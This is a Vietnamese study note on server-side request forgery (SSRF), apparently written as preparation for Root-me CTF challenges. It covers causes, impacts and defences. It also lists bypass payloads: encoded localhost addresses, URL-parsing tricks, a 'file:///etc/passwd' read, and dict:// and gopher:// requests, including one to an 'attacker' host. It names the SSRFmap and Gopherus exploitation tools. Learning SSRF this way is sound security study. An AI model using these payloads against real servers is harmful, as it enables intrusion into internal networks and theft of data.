```
+ Tìm hiểu về SSRF(Khái niệm, nguyên nhân, tác hại + 1 số cách bypass, cách phòng chống).
+ Giải các bài ssrf trên rootme.
```
# SSRF (Server Side Request Forgery)
## Khái niệm
SSRF là cuộc tấn công yêu cầu giả từ máy chủ cho phép kẻ tấn công thay đổi tham số yêu cầu từ đó có thể kiểm soát được yêu cầu của máy chủ, khi đó kẻ tấn công sẽ khiến máy chủ gửi yêu cầu đến 1 máy chủ khác hoặc chính nó nhằm mục đích xấu.
## Nguyên nhân
- Thiếu kiểm soát đầu vào: Khi máy chủ lấy tài nguyên từ tham số được kiểm soát người dùng mà không có kiểm tra hay xác thực thì kẻ tấn công có thể sử dụng nó để thực hiện yêu cầu.
- Sử dụng máy chủ sử dụng được các protocol không cần thiết (gopher://, dict://,...) và mở 1 số port có thể khai thác(redis, SMB,..)
- Sử dụng IP nội bộ: Khi ứng dụng web cho phép sử dụng IP nội bộ, kẻ tấn công từ đó có thể yêu cầu truy cập mà không cần xác thực
## Tác hại + 1 số cách bypass
### Tác hại
- Kẻ tấn công có thể truy cập vào các dữ liệu nhạy cảm trên máy chủ cũng như trên cục bộ, từ đó ăn cắp thông tin quan trọng của người dùng,...
- Vượt qua các lớp bảo mật, truy cập vào mạng cục bộ từ đó dẫn đến các cuộc tấn công khác nghiêm trọng hơn như RCE,...

### 1 số cách bypass
- Trong cuộc tấn công vào chính máy chủ:
  - Sử dụng IP thay thế `127.0.0.1`, `localhost` như: `2130706433` (dạng số nguyên), `127.0.1`, `127.1`, `017700000001`(dạng octal),...
  - Obfuscating các chuỗi bị filter như URL enconde,...
- Open redirection: Khi ứng dụng web redirect, quan soát các tham số trên URL từ đó có thể kiểm soát được.
- URL parsing: 
  - Sử dụng `@` để đưa phần phía trước thành credential 
  - Sử dụng `#` (fragment) để tạo ra tham số mới mà từ đó máy chủ đọc được và truy cập được nó.

- Encode, double encode,...
- Sử dụng các protocols:
  - `file://`: `file:///etc/passwd`
  - `dict://`:`dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>` => `ssrf.php?url=dict://attacker:11111/`
  - `gopher://`: `gopher://<server>:8080/_GET / HTTP/1.0%0A%0A`
  - ...
- Sử dụng tools:
  - <a href="https://github.com/swisskyrepo/SSRFmap" >SSRFMap</a> (phát hiện và khai thác SSRF)
  - <a href="https://github.com/tarunkant/Gopherus" >Gopherus</a> (tạo payload khai thác MySQL, Redis,...)
 
Tham khảo: <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery" >Hacktricks</a>
## Phòng chống
- Kiểm tra xác thực đầu vào: kiểm tra giới hạn phạm vi tham số được đưa vào URL ví dụ như giới hạn các địa chỉ IP có thể yêu cầu đến máy chủ...
- Sử dụng whitelist: chỉ định các URL hay các protocols, wrapper hợp lệ mà ứng dụng có thể kiểm soát được.
- Giới hạn truy cập máy chủ cục bộ, sử dụng cấu hình máy chủ hợp lý.
- Sử dụng tường lửa, thư viện bảo mật và thường xuyên cập nhật chúng.

#Root-me
